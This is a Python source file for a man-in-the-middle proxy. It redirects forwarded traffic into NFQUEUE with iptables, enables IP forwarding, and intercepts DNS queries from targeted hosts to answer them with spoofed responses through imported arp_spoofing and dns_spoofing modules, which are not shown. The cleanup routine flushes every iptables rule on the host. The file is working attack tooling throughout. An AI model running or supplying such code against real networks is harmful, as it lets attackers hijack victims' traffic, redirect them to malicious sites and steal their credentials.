from netfilterqueue import NetfilterQueue
import os
import scapy.all as scapy

import dns_spoofing
import arp_spoofing

#sudo pip install pip==18.0
#sudo pip install --upgrade pip
#sudo apt-get install build-essential python-dev libnetfilter-queue-dev
#sudo pip install NetfilterQueue


#For proxy-ing we rely on port forwarding and use netfilterqueue to intercept
#before packets leave the machine

def setup_iptables():
    os.system("sudo iptables -I FORWARD -j NFQUEUE --queue-num 0")

def undo_iptables():
    os.system("sudo iptables --flush")

def enable_port_forwarding():
    os.system("sudo sysctl -w net.ipv4.ip_forward=1")

nfqueue = None
def setup_proxy():
    global nfqueue
    setup_iptables()
    enable_port_forwarding()
    
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, proxy)
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        undo_iptables()
        nfqueue.unbind()


def proxy(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if dns_spoofing.isDnsQuery(scapy_packet):
        if dns_spoofing.isTarget(scapy_packet):
            dns_spoofing.dns_spoof(scapy_packet)
            packet.drop()
            return

    packet.accept()
    return
